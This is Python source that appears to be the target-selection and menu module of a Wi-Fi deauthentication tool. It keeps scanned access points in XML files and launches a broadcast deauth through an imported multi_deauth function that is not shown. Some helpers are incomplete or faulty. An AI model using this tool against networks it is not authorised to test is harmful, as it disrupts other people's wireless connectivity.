import xml.etree.ElementTree as ET
import re, sys
import os.path
from multideauth import *
interface = ''
aps_list = 'APs.xml'
targets_list = 'targets.xml'
broadcast = 'FF:FF:FF:FF:FF:FF'
#AP handler
def padding(length, text):
    for i in range(0,length):
        if text[i] == "" :
            text = text+" "

def is_mac(address):
    mac_pattern = re.compile(r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})') 
    if mac_pattern.match(address):
        return 1
    else:
        return 0

def APs_exist(fileName):
    if os.path.exists(fileName):
        return 1
    else:
        return 0

def APs_init(fileName):
    aps = ET.Element('AccessPoints')
    apsList = ET.ElementTree(aps)
    with open (fileName, "wb") as files :
        apsList.write(files)

def AP_exist(fileName, bssid):
    if APs_exist(fileName):
        apsList = ET.parse(fileName)
        aps = apsList.getroot()

        for ap in aps.findall('AccessPoint'):
            if ap.findtext('BSSID') == bssid:
                return 1
        return 0
    else:
        return 0

def APs_count(aps):
    #aps = ET.parse(fileName).getroot()
    count = 0
    for ap in aps.findall('AccessPoint'):
        count += 1
    return int(count)

def AP_append(fileName, bssid, ssid, channel, encryption):
    apsList = ET.parse(fileName)
    aps = apsList.getroot()
    id = str(APs_count(aps)+1)
    if not AP_exist(fileName, bssid):
        ap = ET.Element('AccessPoint')
        ap.set('ID',id)
        ap.set('Channel',channel)
        ap.set('Encryption',encryption)
        apBssid = ET.SubElement(ap,'BSSID')
        apBssid.text = bssid
        apSsid = ET.SubElement(ap,'SSID')
        apSsid.text = ssid
        aps.append(ap)
        with open (fileName, "wb") as files :
            apsList.write(files)

def AP_select(apid,fileName,targetFile):
    if not APs_exist(targetFile):
        APs_init(targetFile)

    if APs_exist(fileName):
        aps = ET.parse(fileName).getroot()

        targetList = ET.parse(targetFile)
        targets = targetList.getroot()
        found = 0
        for ap in aps.findall('AccessPoint'):
            if str(apid) == ap.get('ID'):
                AP_append(targetFile,ap.findtext('BSSID'),ap.findtext('SSID'),ap.get('Channel'),ap.get('Encryption'))
                found = 1
        if found == 0 : print('[Access point]: ID %s not found' %(apid))
    else:
        print('[ERROR]: %s not found' %(fileName))

def AP_remove(apid,fileName):
    if APs_exist(fileName):
        apsList = ET.parse(fileName)
        aps = apsList.getroot()
        found = 0
        for ap in aps.findall('AccessPoint'):
            if str(apid) == ap.get('ID'):
                print('[Target list]: Remove AP %s' % (apid))
                aps.remove(ap)
                apsList.write(fileName)
                found = 1
        if found == 0 : print('[ERROR]: Invalid ID')

def APs_show(fileName):
    if APs_exist(fileName):
        apsList = ET.parse(fileName)
        aps = apsList.getroot()

        ap_table_header = "|"+"ID".ljust(3)+"|"+"Encryption".ljust(10)+" | "+"Channel".ljust(8)+" | "+"BSSID".ljust(18)+" | "+"SSID".ljust(30)+"|"

        print("_"*len(str(ap_table_header)))
        print(ap_table_header)
        for ap in aps.findall('AccessPoint'):
            apid = str(ap.get('ID')).ljust(3)
            enc = str(ap.get('Encryption')).ljust(10)
            c = str(ap.get('Channel')).ljust(8)
            bssid = str(ap.findtext('BSSID')).ljust(18)
            ssid = str(ap.findtext('SSID')).ljust(30)
            ap_data = "|"+apid+"|"+enc+" | "+c+" | "+bssid+" | "+ssid+"|"
            print(str(ap_data))    
        print("|"+"_"*(len(str(ap_table_header))-2)+"|")
    else:
        print('[ERROR]: %s not found' %(fileName))

def clear_AP(fileName):
    with open(fileName,'w') as aps_list:
        aps_list.truncate(0)
    APs_init(fileName)

def select_target():
    apid = str(input('[APs list]: Select added AP id:'))
    AP_select(apid,aps_list,targets_list)
    target_menu(interface)

def remove_target():
    apid = str(input('[Targets list]: Select remove AP id:'))
    if re.match('^\d+$',apid):
        AP_remove(apid,targets_list)
    target_menu(interface)

def target_menu(interface):
        os.system('clear')
        print('[Scanned]:')
        APs_show(aps_list)
        print('[Selected]:')
        APs_show(targets_list)
        print('[Function]:')
        print('[1]: Select target')
        print('[2]: Remove target')
        print('[3]: Clear targets')
        print('[4]: Broadcast deauth')
        print('[5]: Deauth single client')
        print('[6]: Exit')
        function = input('[Function]: ')
        if not re.match('^[1-6]$',function):
            print('[ERROR]: Invalid Input')
        else:
            if function == '1' :
                select_target()
            elif function == '2' :
                remove_target()
            elif function == '3' :
                clear_AP(targets_list)
                target_menu(interface)
            elif function == '4':
                try:                
                    multi_deauth(targets_list,interface,broadcast)
                except KeyboardInterrupt:
                    print('[Deauth]: Stop.')
                    target_menu(interface)
            elif function == '5':
                print('working')
                target_menu(interface)
            elif function == '6' :
                sys.exit(0)
            else:
                print('[ERROR]: Invalid Input')
